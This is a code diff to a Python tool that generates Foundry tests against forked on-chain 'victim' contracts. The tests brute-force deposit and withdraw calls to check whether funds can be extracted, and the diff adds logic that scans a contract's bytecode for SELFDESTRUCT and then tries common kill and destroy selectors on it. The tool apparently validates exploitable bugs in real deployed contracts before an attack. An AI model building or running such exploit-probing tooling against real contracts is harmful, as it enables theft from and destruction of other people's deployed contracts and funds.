@@ -1,7 +1,8 @@
 import os
 import subprocess
 import logging
-from typing import Dict, Any, Optional
+from typing import Dict, Any, Optional, List
+from web3 import Web3
 
 logger = logging.getLogger(__name__)
 
@@ -52,6 +53,7 @@ contract HoneypotTestToken is Test {
         vm.label(victim, "Victim");
         vm.label(token, "Token");
         vm.label(attacker, "Attacker");
+        vm.txGasLimit(10000000); // Base network high gas limit
     }
 
     function testSafeCycleToken() public {
@@ -148,6 +150,10 @@ contract HoneypotTestToken is Test {
         if (!success) (success, ) = victim.call(abi.encodeWithSignature("mint(uint256)", tokenAmount));
         if (!success) (success, ) = victim.call(abi.encodeWithSignature("stake(uint256)", tokenAmount));
         if (!success) (success, ) = victim.call(abi.encodeWithSignature("contribute(uint256)", tokenAmount));
+        // Fallback: Raw call with 1 wei
+        if (!success) (success, ) = victim.call{value: 1 wei}("");
+
+        <SELF_DESTRUCT_LOGIC>
         
         require(success, "Deposit failed (tried all variants)");
         vm.warp(block.timestamp + 1 days);
@@ -258,6 +264,7 @@ contract HoneypotTestETH is Test {
         vm.createSelectFork("<RPC_URL>");
         vm.label(victim, "Victim");
         vm.label(attacker, "Attacker");
+        vm.txGasLimit(10000000); // Base network high gas limit
     }
 
     function testSafeCycleETH() public {
@@ -279,6 +286,10 @@ contract HoneypotTestETH is Test {
         if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("stake()"));
         if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("contribute()"));
         if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("enter()"));
+        // Fallback: Raw call with 1 wei
+        if (!success) (success, ) = victim.call{value: 1 wei}("");
+
+        <SELF_DESTRUCT_LOGIC>
         
         require(success, "Deposit failed (tried all variants)");
         vm.warp(block.timestamp + 1 days);
@@ -328,31 +339,98 @@ contract HoneypotTestETH is Test {
 }
 """
 
-def generate_honeypot_test_token(victim_address: str, token_address: str, rpc_url: str, weth_address: str, router_address: str) -> str:
+def _detect_self_destruct_selectors(w3: Web3, address: str) -> List[str]:
+    """
+    Detect if contract has SELFDESTRUCT opcode and return candidate selectors.
+    """
+    try:
+        code = w3.eth.get_code(Web3.to_checksum_address(address))
+        if not code or b'\xff' not in code:
+            return []
+        
+        # If SELFDESTRUCT is present, try common selectors
+        # kill(), destroy(), close(), die(), shutdown()
+        return [
+            "0x41c0e1b5", # kill()
+            "0x83197ef0", # destroy()
+            "0xcbf0b0c0", # suicide()
+            "0x43d726d6", # close()
+            "0x35f46994", # die()
+            "0x0c55699c"  # shutdown()
+        ]
+    except Exception:
+        return []
+
+def _get_self_destruct_logic(selectors: List[str]) -> str:
+    if not selectors:
+        return ""
+    
+    logic = """
+        // Try Self-Destruct triggers (Opcode 0xff detected)
+        bool sdSuccess;
+        // Capture code before potential self-destruct
+        bytes memory originalCode = address(victim).code;
+    """
+    for sel in selectors:
+        logic += f"""
+        (sdSuccess, ) = victim.call(abi.encodeWithSelector(bytes4({sel})));
+        if (sdSuccess) {{
+            console.log("Self-destruct triggered with selector {sel}");
+            if (address(victim).code.length == 0) {{
+                console.log("Contract code destroyed. Reincarnating via vm.etch...");
+                vm.etch(victim, originalCode);
+            }}
+        }}
+        """
+    return logic
+
+def generate_honeypot_test_token(victim_address: str, token_address: str, rpc_url: str, weth_address: str, router_address: str, self_destruct_selectors: List[str] = None) -> str:
     content = HONEYPOT_TEST_TEMPLATE.replace("<VICTIM_ADDRESS>", victim_address)
     content = content.replace("<TOKEN_ADDRESS>", token_address)
     content = content.replace("<RPC_URL>", rpc_url)
     content = content.replace("<WETH_ADDRESS>", weth_address)
     content = content.replace("<ROUTER_ADDRESS>", router_address)
+    
+    sd_logic = _get_self_destruct_logic(self_destruct_selectors)
+    content = content.replace("<SELF_DESTRUCT_LOGIC>", sd_logic)
+    
     return content
 
-def generate_honeypot_test_eth(victim_address: str, rpc_url: str) -> str:
+def generate_honeypot_test_eth(victim_address: str, rpc_url: str, self_destruct_selectors: List[str] = None) -> str:
     content = HONEYPOT_TEST_ETH_TEMPLATE.replace("<VICTIM_ADDRESS>", victim_address)
     content = content.replace("<RPC_URL>", rpc_url)
+    
+    sd_logic = _get_self_destruct_logic(self_destruct_selectors)
+    content = content.replace("<SELF_DESTRUCT_LOGIC>", sd_logic)
+    
     return content
 
-def run_honeypot_simulation_token(victim_address: str, token_address: str, rpc_url: str, weth_address: str, router_address: str) -> Dict[str, Any]:
+def run_honeypot_simulation_token(victim_address: str, token_address: str, rpc_url: str, weth_address: str, router_address: str, w3: Optional[Web3] = None, implementation_address: Optional[str] = None, bug_type: Optional[str] = None) -> Dict[str, Any]:
     """
     Run a forge test to simulate the ETH -> Swap -> Deposit -> Withdraw -> Swap -> ETH cycle.
     """
-    test_content = generate_honeypot_test_token(victim_address, token_address, rpc_url, weth_address, router_address)
+    sd_selectors = []
+    if bug_type == "self_destruct" and w3:
+        target = implementation_address if implementation_address else victim_address
+        sd_selectors = _detect_self_destruct_selectors(w3, target)
+        if sd_selectors:
+            logger.info(f"Injecting Self-Destruct selectors for {target}")
+
+    test_content = generate_honeypot_test_token(victim_address, token_address, rpc_url, weth_address, router_address, sd_selectors)
     return _run_forge_test(victim_address, test_content)
 
-def run_honeypot_simulation_eth(victim_address: str, rpc_url: str) -> Dict[str, Any]:
+def run_honeypot_simulation_eth(victim_address: str, rpc_url: str, w3: Optional[Web3] = None, implementation_address: Optional[str] = None, bug_type: Optional[str] = None) -> Dict[str, Any]:
     """
     Run a forge test to simulate Deposit->Withdraw cycle (ETH).
     """
-    test_content = generate_honeypot_test_eth(victim_address, rpc_url)
+    sd_selectors = []
+    if bug_type == "self_destruct" and w3:
+        target = implementation_address if implementation_address else victim_address
+        sd_selectors = _detect_self_destruct_selectors(w3, target)
+        if sd_selectors:
+            logger.info(f"Injecting Self-Destruct selectors for {target}")
+
+    test_content = generate_honeypot_test_eth(victim_address, rpc_url, sd_selectors)
     return _run_forge_test(victim_address, test_content)
 
 def _run_forge_test(victim_address: str, test_content: str) -> Dict[str, Any]:
